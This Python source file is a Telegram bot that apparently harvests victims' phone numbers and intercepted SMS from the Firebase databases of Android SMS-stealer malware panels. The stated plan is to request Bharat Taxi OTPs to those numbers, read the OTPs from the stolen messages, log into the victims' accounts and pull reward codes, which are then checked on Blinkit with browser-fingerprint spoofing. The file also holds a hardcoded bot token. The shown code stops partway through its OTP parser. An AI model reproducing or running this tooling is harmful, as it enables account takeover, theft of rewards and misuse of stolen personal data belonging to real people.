#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VIEDIET PANEL MASTER  (@autoblinkitbot)
=======================================
- User force-joins the 2 VIEDIET channels before any access.
- Each user gets a unique referral code.
- 1 referral = +1 Firebase panel slot. Bulk add allowed up to slots.
- User runs their own panels -> OTP -> login -> Amul/reward code extraction.
- Every found code is AUTO-CHECKED on Blinkit using the admin's Blinkit
  session (admin logs in once via /blinkitlogin) -> valid/invalid shown.
- Privacy: har user apne codes/panels sirf khud dekh sakta hai — admin
  sirf aggregate stats (counts) dekhta hai, codes ya panel URLs nahi.
- Clean admin panel: dashboard, per-user stats, give extra slots.

ENV:
  BOT_TOKEN        : Telegram bot token (required)
  ADMIN_ID         : comma separated admin ids (default: 8139558808)
  DATA_DIR         : data folder (default: viediet_data)
  OTP_TIMEOUT      : SMS poll seconds (default: 25)
  NUMBER_DELAY     : gap between numbers (default: 2s)
  PANEL_DELAY      : gap between panels (default: 2s)
  TELEGRAM_API     : optional Telegram API mirror (e.g. https://tg.i-c-a.su)
  BLINKIT_BASE_URL : Blinkit API host (default: https://api2.grofers.com)

ADMIN COMMANDS:
  /user <id|@user>       user stats (counts only — codes/panels private)
  /give <id> <slots>     free slots
  /addadmin <id>         kisi ko bhi admin access do (bot se hi)
  /deladmin <id>         admin access hatao
  /blinkitlogin          login Blinkit once (auto-check engine)
  /check CODE            manual code check
  /blinkit               checker stats

REQUIRES: pip install curl_cffi pyTelegramBotAPI requests
"""

import os
import re
import sys
import time
import json
import html
import uuid
import random
import sqlite3
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import telebot
import telebot.apihelper as apihelper
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = os.getenv("BOT_TOKEN", "8773133018:AAEpo5FvlodjuPvthv2-iNoMMWNzFL02_uM")
_raw_admins = os.getenv("ADMIN_ID", "8139558808").strip()
ADMIN_IDS = [int(x) for x in _raw_admins.split(",") if x.strip().lstrip("+-").isdigit()]
if not ADMIN_IDS:
    ADMIN_IDS = [8139558808]
ADMIN_IDS = list(dict.fromkeys(ADMIN_IDS))
DATA_DIR = os.getenv("DATA_DIR", "viediet_data")
OTP_TIMEOUT = int(os.getenv("OTP_TIMEOUT", "25"))
NUMBER_DELAY = int(os.getenv("NUMBER_DELAY", "2"))
PANEL_DELAY = int(os.getenv("PANEL_DELAY", "2"))

# Coloured buttons: style (primary/danger/success) is standard Telegram Bot API 8+.
# icon_custom_emoji_id needs the bot owner to have Premium / purchased usernames —
# Coloured buttons: style (primary/success/danger) har client pe color deta hai.
# icon_custom_emoji_id ke liye bot owner ke paas Telegram Premium / purchased
# username hona chahiye — nahi hai toh USE_CUSTOM_EMOJI=0 kar do.
USE_CUSTOM_EMOJI = os.getenv("USE_CUSTOM_EMOJI", "0") == "1"

# Custom emoji IDs (Telegram built-in set)
EMO_BLUE = "5373141891321699086"
EMO_RED = "5370810157871667232"
EMO_GREEN = "5471984997361523302"

# ═══════════════════════════════════════════════════════════════
# BLINKIT COUPON CHECKER  (merged from blinkitcheck.py)
# ═══════════════════════════════════════════════════════════════

BLINKIT_BASE_URL = os.getenv("BLINKIT_BASE_URL", "https://api2.grofers.com")
BLINKIT_SESSION_FILE = os.path.join(DATA_DIR, "blinkit_session.json")
BLINKIT_VALID_FILE = os.path.join(DATA_DIR, "blinkit_valid.txt")

try:
    from curl_cffi import requests as cffi_requests
    CFFI_OK = True
    # Blinkit TLS fingerprint check karta hai — Chrome impersonation zaroori
    _cffi_session = cffi_requests.Session(impersonate="chrome110", verify=False)
except Exception:
    cffi_requests = None
    _cffi_session = None
    CFFI_OK = False

_blinkit_lock = threading.Lock()
BLINKIT_STATS = {"checked": 0, "valid": 0, "potential": 0, "invalid": 0, "errors": 0}

_FIXED_DEVICE_ID = "".join(random.choices("0123456789abcdef", k=16))
_FIXED_SESSION_UUID = str(uuid.uuid4())
_FIXED_ADV_ID = str(uuid.uuid4())

# ═══════════════════════════════════════════════════════════════
# FORCE JOIN CHANNELS   (channel/group)
# ═══════════════════════════════════════════════════════════════

FORCE_JOIN = [
    ("Channel", "@viedietlooters", "https://t.me/viedietlooters"),
    ("Group", "@viedietbackup", "https://t.me/viedietbackup"),
]

# ═══════════════════════════════════════════════════════════════
# BHARAT TAXI API CONFIG  (verified from amu.py)
# ═══════════════════════════════════════════════════════════════

BHARAT_SEND_OTP_URL = os.getenv("BHARAT_SEND_OTP_URL", "https://api.c2.moving.tech/pilot/app/v2/auth")
BHARAT_VERIFY_OTP_URL = os.getenv("BHARAT_VERIFY_OTP_URL", "https://api.c2.moving.tech/pilot/app/v2/auth/{auth_id}/verify")
BHARAT_REWARDS_URL = os.getenv("BHARAT_REWARDS_URL", "https://api.c2.moving.tech/pilot/app/v2/rewards")
BHARAT_APP_PACKAGE = "in.mobility.bharatTaxi"
BHARAT_CLIENT_VERSION = "0.0.28"
BHARAT_USER_AGENT = "okhttp/4.12.0"

os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH = os.path.join(DATA_DIR, "viediet.db")

BOT = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None
BOT_USERNAME = None

BRAND = "🚕 <b>VIEDIET</b> PANEL MASTER"
FOOTER = "\n\n🤖 Made by <b>viediet</b>"

# ═══════════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════════

_db_lock = threading.Lock()
_processing = set()
_check_cache = {}


def _db():
    con = sqlite3.connect(DB_PATH, timeout=30)
    con.execute("PRAGMA journal_mode=WAL")
    return con


def init_db():
    with _db_lock:
        con = _db()
        try:
            con.executescript("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    refer_code TEXT UNIQUE,
                    referred_by INTEGER,
                    referrals_count INTEGER DEFAULT 0,
                    free_slots INTEGER DEFAULT 0,
                    total_codes INTEGER DEFAULT 0,
                    created_at REAL,
                    last_active REAL
                );
                CREATE TABLE IF NOT EXISTS panels (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    url TEXT,
                    added_at REAL
                );
                CREATE TABLE IF NOT EXISTS referrals (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    referrer_id INTEGER,
                    referred_id INTEGER,
                    created_at REAL
                );
                CREATE TABLE IF NOT EXISTS results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    panel_url TEXT,
                    device_id TEXT,
                    mobile TEXT,
                    status TEXT,
                    codes TEXT,
                    ts REAL
                );
                CREATE TABLE IF NOT EXISTS admins (
                    user_id INTEGER PRIMARY KEY,
                    added_by INTEGER,
                    created_at REAL
                );
                CREATE INDEX IF NOT EXISTS idx_panels_user ON panels(user_id);
                CREATE INDEX IF NOT EXISTS idx_results_user ON results(user_id);
            """)
            for aid in ADMIN_IDS:
                con.execute(
                    "INSERT OR IGNORE INTO admins(user_id, added_by, created_at) VALUES(?,?,?)",
                    (aid, aid, time.time()))
            con.commit()
        finally:
            con.close()


def is_admin(user_id):
    if user_id in ADMIN_IDS:
        return True
    with _db_lock:
        con = _db()
        try:
            row = con.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,)).fetchone()
            return row is not None
        finally:
            con.close()


def add_admin(user_id, added_by):
    with _db_lock:
        con = _db()
        try:
            con.execute(
                "INSERT OR REPLACE INTO admins(user_id, added_by, created_at) VALUES(?,?,?)",
                (user_id, added_by, time.time()))
            con.commit()
        finally:
            con.close()


def remove_admin(user_id):
    with _db_lock:
        con = _db()
        try:
            con.execute("DELETE FROM admins WHERE user_id=?", (user_id,))
            con.commit()
        finally:
            con.close()


def list_admins():
    with _db_lock:
        con = _db()
        try:
            rows = con.execute("SELECT user_id FROM admins ORDER BY created_at DESC").fetchall()
            return [r[0] for r in rows]
        finally:
            con.close()


def ensure_user(user_id, username="", first_name="", referred_by=None):
    with _db_lock:
        con = _db()
        try:
            row = con.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,)).fetchone()
            now = time.time()
            if row:
                con.execute("UPDATE users SET last_active=?, username=?, first_name=? WHERE user_id=?",
                            (now, username or "", first_name or "", user_id))
                con.commit()
                return False
            code = make_refer_code(user_id)
            con.execute(
                "INSERT INTO users(user_id, username, first_name, refer_code, referred_by, created_at, last_active)"
                " VALUES(?,?,?,?,?,?,?)",
                (user_id, username or "", first_name or "", code, referred_by, now, now),
            )
            con.commit()
            return True
        finally:
            con.close()


def make_refer_code(user_id):
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    n = user_id
    s = ""
    while n:
        s = chars[n % 36] + s
        n //= 36
    return ("VIE" + s.upper()[-5:].zfill(5))


def get_user(user_id):
    with _db_lock:
        con = _db()
        try:
            return con.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
        finally:
            con.close()


def user_slots(user_id):
    u = get_user(user_id)
    if not u:
        return 0, 0
    with _db_lock:
        con = _db()
        try:
            used = con.execute("SELECT COUNT(*) FROM panels WHERE user_id=?", (user_id,)).fetchone()[0]
        finally:
            con.close()
    if is_admin(user_id):
        return 10 ** 6, used  # admin = unlimited panels
    refs = u[5] or 0  # referrals_count
    free = u[6] or 0  # free_slots
    return refs + free, used


def slots_display(used, total):
    return "∞" if total >= 10 ** 6 else f"{used}/{total}"


def add_referral(referrer_id, referred_id):
    with _db_lock:
        con = _db()
        try:
            dup = con.execute("SELECT 1 FROM referrals WHERE referrer_id=? AND referred_id=?",
                              (referrer_id, referred_id)).fetchone()
            if dup:
                return False
            con.execute("INSERT INTO referrals(referrer_id, referred_id, created_at) VALUES(?,?,?)",
                        (referrer_id, referred_id, time.time()))
            con.execute("UPDATE users SET referrals_count=referrals_count+1 WHERE user_id=?",
                        (referrer_id,))
            con.commit()
            return True
        finally:
            con.close()


def add_panels(user_id, urls):
    total, used = user_slots(user_id)
    available = max(0, total - used)
    with _db_lock:
        con = _db()
        try:
            existing = set(r[0] for r in con.execute(
                "SELECT url FROM panels WHERE user_id=?", (user_id,)).fetchall())
        finally:
            con.close()
    added, rejected = [], []
    for u in urls:
        if u in existing:
            rejected.append(u)
            continue
        if len(added) >= available:
            rejected.append(u)
            continue
        with _db_lock:
            con = _db()
            try:
                con.execute("INSERT INTO panels(user_id, url, added_at) VALUES(?,?,?)",
                            (user_id, u, time.time()))
                con.commit()
            finally:
                con.close()
        existing.add(u)
        added.append(u)
    return added, rejected, available


def get_user_panels(user_id):
    with _db_lock:
        con = _db()
        try:
            return [r[0] for r in con.execute(
                "SELECT url FROM panels WHERE user_id=? ORDER BY id ASC", (user_id,)).fetchall()]
        finally:
            con.close()


def log_result(user_id, panel_url, device_id, mobile, status, codes):
    with _db_lock:
        con = _db()
        try:
            con.execute(
                "INSERT INTO results(user_id, panel_url, device_id, mobile, status, codes, ts)"
                " VALUES(?,?,?,?,?,?,?)",
                (user_id, panel_url, device_id, mobile, status, json.dumps(codes), time.time()),
            )
            if codes:
                con.execute("UPDATE users SET total_codes=total_codes+? WHERE user_id=?",
                            (len(codes), user_id))
            con.commit()
        finally:
            con.close()


def seen_code(code):
    with _db_lock:
        con = _db()
        try:
            row = con.execute("SELECT 1 FROM results WHERE codes LIKE ? LIMIT 1", ("%" + code + "%",)).fetchone()
            return row is not None
        finally:
            con.close()


def top_users(limit=10):
    with _db_lock:
        con = _db()
        try:
            return con.execute(
                "SELECT user_id, username, first_name, total_codes, referrals_count, free_slots"
                " FROM users ORDER BY total_codes DESC LIMIT ?", (limit,)).fetchall()
        finally:
            con.close()


def find_user(keyword):
    keyword = keyword.strip().lstrip("@")
    with _db_lock:
        con = _db()
        try:
            if keyword.isdigit():
                return con.execute("SELECT * FROM users WHERE user_id=?", (int(keyword),)).fetchone()
            row = con.execute("SELECT * FROM users WHERE username=? COLLATE NOCASE", (keyword,)).fetchone()
            if not row:
                row = con.execute("SELECT * FROM users WHERE refer_code=? COLLATE NOCASE", (keyword,)).fetchone()
            return row
        finally:
            con.close()


def give_slots(user_id, n):
    with _db_lock:
        con = _db()
        try:
            con.execute("UPDATE users SET free_slots=free_slots+? WHERE user_id=?", (n, user_id))
            con.commit()
        finally:
            con.close()


def db_stats():
    with _db_lock:
        con = _db()
        try:
            users = con.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            panels = con.execute("SELECT COUNT(*) FROM panels").fetchone()[0]
            codes = con.execute("SELECT COUNT(*) FROM results WHERE codes<>'[]'").fetchone()[0]
            today0 = time.time() - 86400
            today = con.execute(
                "SELECT COUNT(*) FROM results WHERE codes<>'[]' AND ts>?", (today0,)).fetchone()[0]
            return users, panels, codes, today
        finally:
            con.close()


# ═══════════════════════════════════════════════════════════════
# FORCE JOIN
# ═══════════════════════════════════════════════════════════════

def has_joined(user_id):
    for _, chat, _ in FORCE_JOIN:
        try:
            m = BOT.get_chat_member(chat, user_id)
            if m.status in ("creator", "administrator", "member"):
                continue
            return False
        except Exception:
            return False
    return True


def force_join_markup():
    kb = InlineKeyboardMarkup(row_width=1)
    for label, _, link in FORCE_JOIN:
        kb.add(url_btn(f"🔴 JOIN {label.upper()}", link, style="danger", icon=EMO_RED))
    kb.add(btn("✅ I HAVE JOINED", "check_join", style="success", icon=EMO_GREEN))
    return kb


def send_force_join(chat_id):
    try:
        BOT.send_message(
            chat_id,
            f"{BRAND}\n\n"
            f"🔒 <b>ACCESS DENIED</b>\n\n"
            f"Bot use karne ke liye dono ko join karna zaroori hai:\n\n"
            f"1️⃣ <b>Channel</b> ➜ <a href='https://t.me/viedietlooters'>viedietlooters</a>\n"
            f"2️⃣ <b>Group</b> ➜ <a href='https://t.me/viedietbackup'>viedietbackup</a>\n\n"
            f"✅ Dono join karne ke baad <b>'I HAVE JOINED'</b> dabao." + FOOTER,
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=force_join_markup(),
        )
    except Exception:
        pass


def check_and_reply(chat_id, user_id):
    if has_joined(user_id) or is_admin(user_id):
        send_home(chat_id, user_id)
    else:
        send_force_join(chat_id)


# ═══════════════════════════════════════════════════════════════
# UI
# ═══════════════════════════════════════════════════════════════

def btn(text, data, style=None, icon=None):
    if not data:
        raise ValueError("callback_data required")
    kwargs = {}
    if style:
        kwargs["style"] = style
    if USE_CUSTOM_EMOJI and icon:
        kwargs["icon_custom_emoji_id"] = icon
    return InlineKeyboardButton(text, callback_data=data, **kwargs)


def url_btn(text, url, style=None, icon=None):
    kwargs = {}
    if style:
        kwargs["style"] = style
    if USE_CUSTOM_EMOJI and icon:
        kwargs["icon_custom_emoji_id"] = icon
    return InlineKeyboardButton(text, url=url, **kwargs)


def home_markup(is_admin=False):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(btn("📂 ADD PANEL", "add_panel", style="primary", icon=EMO_BLUE))
    kb.add(btn("🔎 CHECK PANELS", "check_panels", style="primary", icon=EMO_BLUE))
    kb.add(btn("🎯 RUN CODES", "run_menu", style="primary", icon=EMO_BLUE))
    kb.add(btn("📊 MY STATS", "my_stats", style="primary", icon=EMO_BLUE))
    kb.add(btn("🔗 REFER & EARN", "refer", style="success", icon=EMO_GREEN))
    if is_admin:
        kb.add(btn("🛠 ADMIN PANEL", "admin_menu", style="danger", icon=EMO_RED))
    return kb


def send_home(chat_id, user_id):
    u = get_user(user_id)
    name = (u[2] or "user") if u else "user"
    code = u[3] if u else ""
    total, used = user_slots(user_id)
    link = f"https://t.me/{BOT_USERNAME or 'autoblinkitbot'}?start={code}"
    BOT.send_message(
        chat_id,
        f"{BRAND}\n\n"
        f"👤 <b>{html.escape(name)}</b>\n"
        f"🔗 Refer: <code>{link}</code>\n"
        f"📂 Panels: <b>{slots_display(used, total)}</b> slots\n"
        f"🎁 Codes Found: <b>{u[7] if u else 0}</b>\n\n"
        f"Select karo 👇" + FOOTER,
        parse_mode="HTML",
        reply_markup=home_markup(is_admin(user_id)),
    )


def back_home_markup():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(btn("🏠 HOME", "home", style="primary", icon=EMO_BLUE))
    return kb


# ═══════════════════════════════════════════════════════════════
# FIREBASE HELPERS
# ═══════════════════════════════════════════════════════════════

def fb_get_sync(path, panel_url, timeout=8):
    url = panel_url.rstrip("/") + "/" + path.lstrip("/")
    if not url.endswith(".json"):
        url += ".json"
    try:
        resp = requests.get(url, timeout=timeout)
        if resp.status_code == 200:
            try:
                return resp.json()
            except Exception:
                return resp.text
    except Exception:
        pass
    return None


def extract_all_nums(*dicts):
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
                     "mobNo", "phoneNumber", "phone", "mobile"]
    for d in dicts:
        if not isinstance(d, dict):
            continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) >= 10:
                nums.append(re.sub(r"\D", "", val)[-10:])
    return list(set(nums))


def refer_numbers(sim):
    nums, seen = [], set()
    for key in ("sim1Number", "sim2Number"):
        val = str(sim.get(key, "") if isinstance(sim, dict) else "").strip()
        if val.startswith("+91"):
            val = val[3:]
        elif val.startswith("91"):
            val = val[2:]
        val = re.sub(r"\D", "", val)
        if len(val) == 10 and val not in seen:
            seen.add(val)
            nums.append(val)
    return nums


def _unwrap(d):
    while isinstance(d, dict) and list(d.keys()) == ["data"] and isinstance(d["data"], dict):
        d = d["data"]
    return d


PHONE_KEYS = ("mobile", "mobileno", "mobile_number", "mobileNumber", "mobile_no",
              "mob", "mobno", "phone", "phoneNumber", "phone_number", "contact",
              "whatsapp", "number", "sim1", "sim2", "sim1number", "sim2number",
              "mobileNumber2")


def deep_find_mobiles(*nodes):
    nums, seen = [], set()

    def rec(node):
        if isinstance(node, dict):
            for k, v in node.items():
                if isinstance(v, str) and k.lower() in PHONE_KEYS:
                    clean = re.sub(r"\D", "", v)
                    if len(clean) == 10 and clean not in seen:
                        seen.add(clean)
                        nums.append(clean)
                elif isinstance(v, (dict, list)):
                    rec(v)
        elif isinstance(node, list):
            for item in node:
                rec(item)

    for n in nodes:
        rec(n)
    return nums


# SMS node ke possible paths (har panel ki apni jagah — lorefer v3 se)
SMS_PATHS = [
    "user_sms/{dev}",            # NV panels: received SMS (tillu2, chfjfj, muajob)
    "All_Users/sms/{dev}",       # spy25-style: received SMS push keys
    "All_Users/Data/{dev}/sms",  # NV command node (outgoing — filter karna)
    "sms/{dev}",                 # kuch root pe direct 'sms'
    "All_Users/user_sms/{dev}",  # nested
]

NON_DEVICE_KEYS = {"DeviceInfo", "Admin", "commands", "Number", "numbers", "action", "sms"}


def flatten_sms(value, depth=0):
    """Panels alag-alag SMS structure store karte hain — sab handle karo."""
    out = []
    if depth > 4 or value is None:
        return out
    if isinstance(value, dict):
        body = (value.get("body") or value.get("message") or value.get("text")
                or value.get("Body") or value.get("Message") or value.get("smsBody"))
        sender = (value.get("from") or value.get("from_number") or value.get("sender")
                  or value.get("address") or value.get("phone") or value.get("num")
                  or value.get("Number"))
        if body is not None:
            out.append({"body": str(body), "sender": str(sender or "")})
        else:
            for v in value.values():
                out.extend(flatten_sms(v, depth + 1))
    elif isinstance(value, list):
        for v in value:
            out.extend(flatten_sms(v, depth + 1))
    return out


def is_outgoing_sms(sms_value):
    """Sent/command SMS ko ignore karo (type=sent, sender 'You', NV# command)."""
    if not isinstance(sms_value, dict):
        return False
    if str(sms_value.get("type", "")).lower() == "sent":
        return True
    status = str(sms_value.get("Status") or sms_value.get("status") or "").lower()
    if status in ("sent done", "sent", "sending"):
        return True
    sender = str(sms_value.get("sender") or sms_value.get("from") or "")
    if sender.lower().startswith("you"):
        return True
    body = str(sms_value.get("body") or sms_value.get("message") or "")
    if body.startswith("NV#") or body.startswith("NV "):
        return True
    return False


def sms_dedup_key(sms_key, sms_value):
    """SMS record ka unique key. Single-slot records (user_sms/{num}, webhookEvent)
    overwrite hote hain — isliye timestamp/id/body hash bhi mix karte hain."""
    if isinstance(sms_value, dict):
        for f in ("timestamp", "id", "message_number", "receivedDate", "formattedTimestamp", "date", "_t"):
            if f in sms_value and sms_value[f] is not None:
                return f"{sms_key}|{f}|{sms_value[f]}"
        body = str(sms_value.get("body") or sms_value.get("message") or "")
        return f"{sms_key}|{hash(body) & 0xffffffff}"
    return sms_key


def fetch_sms(panel_url, device_id, sms_paths=None, match_number=None):
    """SMS node read — saare paths MERGE karke ek dict me lao (pehla non-empty
    path hi mat lo — single-slot records overwrite hote hain). match_number diya
    ho (Verify_Device style) toh Number field se filter."""
    paths = list(sms_paths or []) + list(SMS_PATHS)
    tried = set()
    merged = {}
    for path_tpl in paths:
        try:
            path = path_tpl.format(dev=device_id) if "{dev}" in path_tpl else path_tpl
        except Exception:
            continue
        if path in tried:
            continue
        tried.add(path)
        try:
            if path.lower() == "verify_device" and match_number:
                r = requests.get(f"{panel_url.rstrip('/')}/Verify_Device.json", timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, dict) and data:
                        clean = re.sub(r"\D", "", match_number)[-10:]
                        filtered = {k: v for k, v in data.items()
                                    if isinstance(v, dict)
                                    and re.sub(r"\D", "", str(v.get("Number", "")))[-10:] == clean}
                        for k, v in filtered.items():
                            merged[f"vd|{k}"] = v
                continue
            data = fb_get_sync(path, panel_url, timeout=5)
            if isinstance(data, dict) and data:
                for k, v in data.items():
                    merged[f"{path}|{k}"] = v
        except Exception:
            continue
    return merged


def extract_nums_from_sms(dev_sms):
    """SMS sender numbers se numbers nikalna (fallback jab simDetails na ho)."""
    nums = []
    for k, v in list(dev_sms.items())[:10]:
        for parsed in flatten_sms(v):
            sender = parsed["sender"]
            m = re.search(r"\d{10,12}", sender)
            if m:
                nums.append(m.group(0)[-10:])
    return list(set(nums))[:3]


def check_panel_active(url):
    """Multiple Firebase structures handle karta hai (lorefer v3 logic):
      1) NV panels:  All_Users/Data/{dev} -> phoneNumber direct
      2) spy25:      All_Users/simDetails + All_Users/Data/DeviceInfo
      3) All_Users/sms: keys device ids hain
      4) user_sms:   keys device-id ya phone-number (muajob style)
      5) ufff-style: clients/{dev} -> phoneNumber
      Devices bina numbers: pehli SMS se number nikaal lo.
    """
    data_all = fb_get_sync("All_Users/Data", url)
    if not isinstance(data_all, dict):
        data_all = {}
    device_info_all = fb_get_sync("All_Users/Data/DeviceInfo", url)
    if not isinstance(device_info_all, dict):
        device_info_all = {}
    sim_all = fb_get_sync("All_Users/simDetails", url)
    if not isinstance(sim_all, dict):
        sim_all = {}
    sms_keys = fb_get_sync("All_Users/sms", url)
    if not isinstance(sms_keys, dict):
        sms_keys = {}
    user_sms_keys = fb_get_sync("user_sms", url)
    if not isinstance(user_sms_keys, dict):
        user_sms_keys = {}
    clients_all = fb_get_sync("clients", url)
    if not isinstance(clients_all, dict):
        clients_all = {}

    devices = {}

    # ── Method 1 (NV panels): All_Users/Data full — har key device hai ──
    if data_all:
        for dev_id, dev in data_all.items():
            if dev_id in NON_DEVICE_KEYS or not isinstance(dev, dict):
                continue
            dev = _unwrap(dev)
            nums = extract_all_nums(dev)
            if nums:
                devices[dev_id] = {
                    "numbers": nums,
                    "status": "online",
                    "sms_paths": [
                        "user_sms/{dev}",
                        "All_Users/sms/{dev}",
                        "All_Users/Data/{dev}/sms",
                    ],
                }

    # ── Method 2 (spy25): simDetails + DeviceInfo ─────────────────
    if sim_all:
        for dev_id, sim in sim_all.items():
            sim = _unwrap(sim)
            if not isinstance(sim, dict):
                continue
            info = device_info_all.get(dev_id)
            info = _unwrap(info) if isinstance(info, dict) else {}
            if not isinstance(info, dict):
                info = {}
            status = str(info.get("Status", "") or "").strip().lower()
            nums = refer_numbers(sim)
            if not nums:
                nums = extract_all_nums(sim, info)
            if not nums:
                continue
            dev = devices.get(dev_id, {
                "numbers": [], "status": "offline",
                "sms_paths": ["All_Users/sms/{dev}", "user_sms/{dev}", "All_Users/Data/{dev}/sms"],
            })
            if not dev["numbers"]:
                dev["numbers"] = nums
            if status in ("online", "1", "true"):
                dev["status"] = "online"
            devices[dev_id] = dev

    # ── Method 3: All_Users/sms keys device ids hain (spy25 style) ──
    if sms_keys:
        for dev_id in sms_keys:
            if dev_id in devices or dev_id in NON_DEVICE_KEYS:
                continue
            devices[dev_id] = {
                "numbers": [], "status": "online",
                "sms_paths": ["All_Users/sms/{dev}", "user_sms/{dev}", "All_Users/Data/{dev}/sms"],
            }

    # ── Method 4: user_sms keys — device id ya phone number (muajob) ──
    if user_sms_keys:
        for k in user_sms_keys:
            if re.fullmatch(r"\d{10,13}", str(k)):
                num = str(k)[-10:]
                fid = f"num|{num}"
                if fid not in devices:
                    devices[fid] = {
                        "numbers": [num], "status": "online",
                        "sms_paths": [f"user_sms/{k}"],
                    }
            elif k not in devices and k not in NON_DEVICE_KEYS:
                devices[k] = {
                    "numbers": [], "status": "online",
                    "sms_paths": ["user_sms/{dev}", "All_Users/sms/{dev}", "All_Users/Data/{dev}/sms"],
                }

    # ── Method 5 (ufff-style): clients/{dev} -> phoneNumber ─────────
    if clients_all:
        for dev_id, dev in clients_all.items():
            if dev_id in NON_DEVICE_KEYS or not isinstance(dev, dict):
                continue
            dev = _unwrap(dev)
            nums = extract_all_nums(dev)
            if nums:
                devices[dev_id] = {
                    "numbers": nums,
                    "status": "online",
                    "sms_paths": ["Verify_Device", "clients/{dev}/webhookEvent", "user_sms/{dev}",
                                  "All_Users/sms/{dev}", "sms/{dev}"],
                }

    # ── Bina numbers wale devices: pehli SMS se number nikaalo ──
    for dev_id in list(devices.keys()):
        d = devices[dev_id]
        if d["numbers"]:
            continue
        for path_tpl in d.get("sms_paths", []):
            try:
                path = path_tpl.format(dev=dev_id) if "{dev}" in path_tpl else path_tpl
            except Exception:
                continue
            sample = fb_get_sync(path, url)
            if isinstance(sample, dict):
                nums = extract_nums_from_sms(sample)
                if nums:
                    d["numbers"] = nums
                    break
        if not d["numbers"]:
            del devices[dev_id]

    if not devices:
        return None

    online_devices = [{"id": k, **v} for k, v in devices.items() if v["status"] == "online"]
    if not online_devices:
        online_devices = [{"id": k, **v} for k, v in devices.items()]

    total_nums = sum(len(d["numbers"]) for d in online_devices)
    if total_nums == 0:
        return None
    return {
        "url": url,
        "online_devices": online_devices,
        "total_devices": len(online_devices),
        "total_numbers": total_nums,
    }


# ═══════════════════════════════════════════════════════════════
# PANEL CHECKER  (free, koi limit nahi)
# ═══════════════════════════════════════════════════════════════

def check_panel_status(url):
    """Ek panel ki status — ACTIVE (numbers mile) / LIVE (DB live, numbers nahi) / DEAD."""
    try:
        panel = check_panel_active(url)
        if panel:
            return {"url": url, "active": True, "devices": panel["total_devices"],
                    "numbers": panel["total_numbers"], "state": "ACTIVE"}
    except Exception:
        pass
    try:
        for probe in ("All_Users", "user_sms", "clients", ""):
            resp = fb_get_sync(probe, url, timeout=4)
            if resp is not None:
                return {"url": url, "active": False, "devices": 0, "numbers": 0, "state": "LIVE"}
    except Exception:
        pass
    return {"url": url, "active": False, "devices": 0, "numbers": 0, "state": "DEAD"}


def check_panels_bulk(chat_id, user_id, urls, label):
    """Sabhi URLs parallel check karke report bhejta hai (free, koi limit nahi)."""
    total = len(urls)
    done = 0
    results = []
    lines = []
    with ThreadPoolExecutor(max_workers=16) as ex:
        futs = {ex.submit(check_panel_status, u): u for u in urls}
        for fut in as_completed(futs):
            try:
                r = fut.result()
            except Exception:
                r = {"url": futs[fut], "active": False, "devices": 0, "numbers": 0, "state": "DEAD"}
            results.append(r)
            done += 1
            tag = r["url"].split("//")[1][:34] if "//" in r["url"] else r["url"]
            lines.append(f"{'✅' if r['active'] else '❌'} {tag}")
            progress(chat_id, _progress_text(label, done, total, lines))
    active = [r for r in results if r["active"]]
    live = [r for r in results if r["state"] == "LIVE"]
    dead = [r for r in results if r["state"] == "DEAD"]
    _check_cache[user_id] = {"active": [r["url"] for r in active], "all": urls}
    msg = (f"🔎 <b>CHECK PANELS — {label}</b> | <code>{done}/{total}</code>\n\n"
           f"✅ <b>ACTIVE:</b> {len(active)}"
           f"  |  ⚠️ <b>LIVE (no numbers):</b> {len(live)}"
           f"  |  ❌ <b>INACTIVE:</b> {len(dead)}\n")
    if active:
        msg += "\n✅ <b>ACTIVE PANELS:</b>\n" + "\n".join(
            f"✅ <code>{html.escape(r['url'][:60])}</code> ({r['devices']} dev / {r['numbers']} num)"
            for r in active[:12])
        if len(active) > 12:
            msg += f"\n... +{len(active) - 12} aur"
    if dead:
        msg += "\n\n❌ <b>INACTIVE:</b>\n" + "\n".join(
            f"❌ <code>{html.escape(r['url'][:60])}</code>" for r in dead[:12])
        if len(dead) > 12:
            msg += f"\n... +{len(dead) - 12} aur"
    kb = InlineKeyboardMarkup(row_width=1)
    if active:
        kb.add(btn(f"✅ ADD ACTIVE PANELS ({len(active)})", "add_active", style="success", icon=EMO_GREEN))
    kb.add(btn(f"📂 ADD ALL ({total})", "add_all_checked", style="primary", icon=EMO_BLUE))
    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
    try:
        BOT.send_message(chat_id, msg, parse_mode="HTML", reply_markup=kb)
    except Exception:
        BOT.send_message(chat_id, "🔎 Check done — report bhejte time error aaya.", reply_markup=kb)


def extract_bharat_otp(body):
    if not body or "otp" not in body.lower():
        return None
    m = re.search(r'OTP[^.\n]{0,60}?\bis\s*[:=]?\s*(\d{4,6})\b', body, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r'OTP[^.\n]{0,60}?[:=]\s*(\d{4,6})\b', body, re.IGNORECASE)
    if m:
        return m.group(1)
    if re.search(r'\b(?:is|login|verification|verify|code)\b|[:=]', body, re.IGNORECASE):
        four = re.findall(r'\b(\d{4})\b', body)
        if four:
            return four[0]
